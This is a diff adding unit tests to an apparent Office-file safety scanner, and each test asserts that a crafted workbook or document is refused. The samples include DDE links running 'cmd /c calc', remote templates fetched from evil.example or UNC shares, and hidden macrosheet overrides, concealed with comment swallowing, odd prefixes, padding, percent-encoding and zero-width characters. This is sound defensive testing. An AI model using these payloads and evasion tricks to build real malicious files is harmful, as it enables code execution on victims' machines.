@@ -368,3 +368,59 @@ describe("size limits that real files meet", () => {
     await timed(() => run(b), 20_000);
   }, 120_000);
 });
+
+describe("markup that hides a tag from the reader", () => {
+  const MS = "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet";
+  const RNS = "http://schemas.openxmlformats.org/package/2006/relationships";
+  const swallow = (tag: string, inner: string) => `<!-- <${tag} a="--><${inner}/><!--"/> -->`;
+  const book = (extra: Part[]) => zip([{ name: "xl/workbook.xml", body: "<w/>" }, ...extra]);
+  const linkBook = (name: string, body: string, target: string) =>
+    zip([
+      { name: "[Content_Types].xml", body: types(XLSX_CT) },
+      { name: "xl/workbook.xml", body: "<w/>" },
+      { name: "xl/_rels/workbook.xml.rels", body: rels(rel("r9", "http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink", target)) },
+      { name, body },
+    ]);
+  const DDE = '<ddeLink ddeService="cmd" ddeTopic="/c calc"/>';
+
+  it("refuses a comment that swallows the real relationship or override", async () => {
+    refused(await run(await tplDoc(rels(swallow("Relationship", `Relationship Id='rId1' Type='${TPL}' Target='https://evil.example/t.dotm' TargetMode='External'`)))));
+    const ct = types(XLSX_CT, swallow("Override", "Override PartName='/xl/worksheets/sheet2.xml' ContentType='application/vnd.ms-excel.macrosheet+xml'"));
+    refused(await run(await book([{ name: "[Content_Types].xml", body: ct }, { name: "xl/worksheets/sheet2.xml", body: "<xm:macrosheet/>" }]), "a.xlsx"));
+  });
+
+  it("refuses CDATA, entity declarations and other processing instructions, and takes the xml declaration", async () => {
+    for (const x of ["<![CDATA[ <Relationship/> ]]>", "<!ENTITY a 'b'>", "<?php x ?>"]) {
+      refused(await run(await tplDoc(`<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${x}</Relationships>`)));
+    }
+    accepted(await run(await tplDoc(rels(rel("rId1", TPL, "Normal.dotm", true)))));
+  });
+
+  it("finds elements under any prefix, however it is spelled", async () => {
+    const x = `<?xml version="1.0"?><Relationships xmlns="${RNS}" xmlns:\u00e9="${RNS}"><\u00e9:Relationship Id="rId1" Type="${TPL}" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>`;
+    refused(await run(await tplDoc(x)));
+    refused(await run(await linkBook("xl/media/e.xml", `<\u00e9:externalLink xmlns:\u00e9="x"><\u00e9:ddeLink ddeService="cmd" ddeTopic="/c calc"/></\u00e9:externalLink>`, "media/e.xml"), "a.xlsx"));
+  });
+
+  it("takes an external link part only if its first child is an external book", async () => {
+    const pad = " ".repeat(10000);
+    refused(await run(await linkBook("xl/externalLinks/externalLink1.xml", `<externalLink>${pad}${DDE}</externalLink>`, "externalLinks/externalLink1.xml"), "a.xlsx"));
+    refused(await run(await linkBook("xl/externalLinks/externalLink1.xml", `<externalLink a="${"x".repeat(10000)}">${DDE}</externalLink>`, "externalLinks/externalLink1.xml"), "a.xlsx"));
+    refused(await run(await linkBook("xl/externalLinks/externalLink1.xml", "<externalLink><somethingElse/></externalLink>", "externalLinks/externalLink1.xml"), "a.xlsx"));
+    accepted(await run(await linkBook("xl/externalLinks/externalLink1.xml", '<externalLink><externalBook r:id="rId1"/></externalLink>', "externalLinks/externalLink1.xml"), "a.xlsx"));
+  });
+
+  it("resolves an external link's target the way Office does, and refuses one that names no part", async () => {
+    refused(await run(await linkBook("xl/media/e.xml", `<externalLink>${DDE}</externalLink>`, `media${BS}e.xml`), "a.xlsx"));
+    refused(await run(await linkBook("xl/media/e.xml", `<externalLink>${DDE}</externalLink>`, "media%2Fe.xml"), "a.xlsx"));
+    refused(await run(await linkBook("xl/media/e.xml", "<externalLink><externalBook/></externalLink>", "media/missing.xml"), "a.xlsx"));
+  });
+
+  it("looks at every percent-decoded form of a target, and at invisible characters", async () => {
+    const fetched = async (t: string) => run(await tplDoc(rels(rel("rId1", TPL, t, true))));
+    for (const t of ["%5C%5Cevil%5Cshare%5Ct.dotm", "%2F%2Fevil/share/t.dotm", "%255C%255Cevil%255Cs%255Ct.dotm", "\u200b" + BS + BS + "evil" + BS + "share" + BS + "t.dotm", "file:///C:/../" + BS + BS + "evil" + BS + "s" + BS + "t.dotm", "Normal\u200b.dotm"]) {
+      refused(await fetched(t));
+    }
+    accepted(await fetched("My%20Templates/Normal.dotm"));
+  });
+});
